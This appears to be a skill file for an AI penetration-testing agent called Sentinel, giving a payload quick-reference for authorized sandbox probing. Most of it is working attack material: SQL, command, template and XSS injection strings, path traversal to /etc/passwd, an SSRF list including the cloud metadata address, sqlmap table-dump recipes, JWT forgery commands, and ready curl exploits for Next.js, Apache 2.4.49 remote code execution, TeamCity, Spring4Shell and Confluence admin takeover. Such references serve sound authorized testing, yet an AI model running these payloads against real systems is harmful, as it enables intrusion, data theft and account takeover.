---
name: sentinel-payloads
description: Compact curated payload reference for the Sentinel agent - SQL injection, XSS, command injection, SSRF, path traversal quick lists for authorized-target probing. Use during active probe phases when constructing evidence-grade requests.
---

# Sentinel payload quick-reference

Lean set tuned for EVIDENCE-GRADE probing (confirm-or-deny, not spray).
Full libraries: SecLists (github.com/danielmiessler/SecLists). Rate-limit all.

## SQL injection (confirmation-grade)

```
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--
1' AND SLEEP(3)--            (time-based; observe ~3s delay)
1 AND 1=CAST((SELECT current_database()) AS INT)--   (error-based PG)
```
Confirm = auth bypass, data in response, or deterministic timing delta.
Record exact request + response snippet.

## Command injection

```
; id
$(id)
`id`
| id
& sleep 5 &
```
Confirm = command output in response OR consistent timing delta. Note context
(quote-closed? piped?).

## Path traversal

```
../../../../etc/passwd
..\/..\/..\/etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
Confirm = root:x:0:0 or known file content returned. SPA fallbacks returning
index.html are NOT traversal — validate content, not status alone.

## SSRF

```
http://127.0.0.1:<port>
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
gopher://127.0.0.1:6379/_%2BINFO%2B
```
Only where target fetches URLs by design. NEVER actually contact cloud
metadata from your own tooling — the guard hard-denies it; if a TARGET's
response indicates it fetched metadata, that is the finding (report what the
target did, do not repeat it).

## XSS (confirmation via marker, not alert())

```
"><script>console.log('SENTINEL_MARKER')</script>
<img src=x onerror="console.log('SENTINEL_MARKER')">
{{7*7}}          (template engines)
${7*7}           (EL/template variants)
```
Confirm = marker reflected unencoded in response body, or template math
evaluated. Console.log markers avoid side effects vs alert().

## Tool-backed recipes (prebaked image; embed SENTINEL_GRANT)

Prefer these over hand-rolled payloads once a vuln class is suspected — they
produce reproducible artifacts that clear the 5-check gate faster.

```bash
# SQLi (DVWA/Juice Shop/VAmPI/DSVW) — dump proof, not just detect
sqlmap -u "<url>?id=1" --batch --level=2 --risk=2 --dbs --output-dir=artifacts/sqlmap
sqlmap -u "<url>" --data="username=a&password=b" --batch --dump -T users --output-dir=artifacts/sqlmap

# JWT — RS256->HS256 confusion (Juice Shop admin forgery), none-alg, weak-secret
jwt_tool <token> -X k -pk artifacts/pubkey.pem      # key confusion
jwt_tool <token> -X a                               # alg:none
jwt_tool <token> -C -d /usr/share/wordlists/*.txt   # crack weak HMAC secret

# Params / hidden endpoints / dir brute
arjun -u "<url>" -oJ artifacts/arjun.json           # discover hidden params
ffuf -u "<url>/FUZZ" -w <wordlist> -o artifacts/ffuf.json
gobuster dir -u "<url>" -w <wordlist> -o artifacts/gobuster.txt

# XSS at scale (reflected/DOM sink discovery)
dalfox url "<url>?q=FUZZ" -o artifacts/dalfox.txt

# Template scan + TLS
nuclei -u "<url>" -severity low,medium,high,critical -rl 20 -o artifacts/nuclei.txt
testssl.sh --quiet --jsonfile artifacts/testssl.json "<host>:443"
```

## Known-CVE recipes

### CVE-2025-29927 — Next.js middleware auth bypass (Critical, self-hosted only)

Fingerprint Next.js first (`x-powered-by: Next.js`, `/_next/static/...`,
`__NEXT_DATA__`). If middleware gates a route, confirm the bypass with a
two-request behavioral diff (send `x-middleware-subrequest`; a redirect/401/403
turning into 200 = middleware skipped). Detection and exploitation are the same
primitive — one header, no auth. Version-dependent payload (widest first):

```bash
# clean vs spoofed on a middleware-gated route
curl -s -o /dev/null -w '%{http_code}\n' --max-redirs 0 "<url>/admin"   # e.g. 307/401
curl -s -w '%{http_code}\n' --max-redirs 0 \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  "<url>/admin"                                                          # 200 => VULNERABLE
# payload fallbacks: "src/middleware:..:x5", "middleware", "src/middleware", "pages/_middleware"
```
Ready-made detector + demo lab: `target/nextjs-cve-lab/detect.sh <base-url> [path] [marker]`
(exit 0 VULNERABLE / 1 patched); boot the lab with `sandbox-setup/nextjs-cve.sh`.
Patched at 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5. Vercel-hosted is not exploitable
(edge strips the header). Works via `http_probe` for black-box targets.

### CVE-2021-41773 / -42013 — Apache 2.4.49/2.4.50 path traversal → RCE (Critical, CISA KEV)

`--path-as-is` is mandatory (curl must not normalise the `../`). File read via a
static alias prefix; RCE via a CGI prefix if `mod_cgi` is on. 2.4.49 uses one
`%2e` per `../`; 2.4.50 needs the double-encoded `%%32%65` form.

```bash
# file read (static prefix, e.g. /icons/)
curl -s --path-as-is "<url>/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"   # root:... => VULN
# RCE (CGI prefix + shell reachable)
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; id' \
  "<url>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"                        # uid=... => VULN
```
Detector + lab: `target/apache-cve-lab/detect.sh <base-url>` (file-read + RCE,
exit 0/1); boot with `sandbox-setup/apache-cve.sh` (docker httpd:2.4.49).
Patched at 2.4.51 (2.4.50 was incomplete → -42013). Works via `http_probe`.

### CVE-2024-27198 — JetBrains TeamCity auth bypass → RCE (Critical, CISA KEV)

Reach any authenticated REST endpoint unauth via the alternate-path trick:
`/hax?jsp=/app/rest/<endpoint>;.jsp` (the `;.jsp` suffix passes the public-
resource check; the real endpoint executes). Read-only detection:
```bash
curl -s "<url>/hax?jsp=/app/rest/server;.jsp"     # returns server version JSON/XML => VULN
```
Full impact: POST to `/hax?jsp=/app/rest/users;.jsp` creates a SYSTEM_ADMIN
(lab only). Detector + lab: `target/teamcity-cve-lab/detect.sh <base-url>`
(read-only, never creates a user); boot `sandbox-setup/teamcity-cve.sh`
(jetbrains/teamcity-server:2023.11.3). Patched at 2023.11.4. Works via `http_probe`.

### CVE-2022-22965 — Spring4Shell RCE (Critical)

Data-binding RCE on Spring MVC 5.3.x/5.2.x + WAR + Tomcat + JDK 9+. The
`class.module.classLoader.resources.context.parent.pipeline.first.*` gadget
writes a JSP webshell into Tomcat's ROOT, then `GET /shell.jsp?cmd=id`.
Detector + lab: `target/spring4shell-cve-lab/detect.sh <base-url> [/greeting]`
(writes a random-named JSP, runs `id`, exit 0/1); boot with
`sandbox-setup/spring4shell-cve.sh` (multi-stage Maven→Tomcat build).
Patched at Spring 5.3.18 / 5.2.20. Needs a data-binding endpoint (POJO param).

### CVE-2023-22515 — Confluence broken access control (Critical, CISA KEV)

Unauth: flip `applicationConfig.setupComplete=false` via `/server-info.action`,
re-opening the setup wizard, then create a SYSTEM admin at
`/setup/setupadministrator.action`. Affected 8.0.0–8.5.1 (fixed 8.5.2).
Detector + lab: `target/confluence-cve-lab/detect.sh <base-url>` (flips the flag
and confirms the wizard re-opens; does NOT create an admin — state-changing, lab
only); bring up with `sandbox-setup/confluence-cve.sh` (Confluence needs a
one-time trial-license setup — not headless).

## Usage rules

- One payload class per probe batch; log every request to artifacts.
- Any payload that could modify target state (POST/PUT) requires its own grant.
- Injection attempts against the SENTINEL pipeline itself (scope-guard,
  harness) are impossible by construction — payloads here are only for the
  scoped target inside the sandbox.
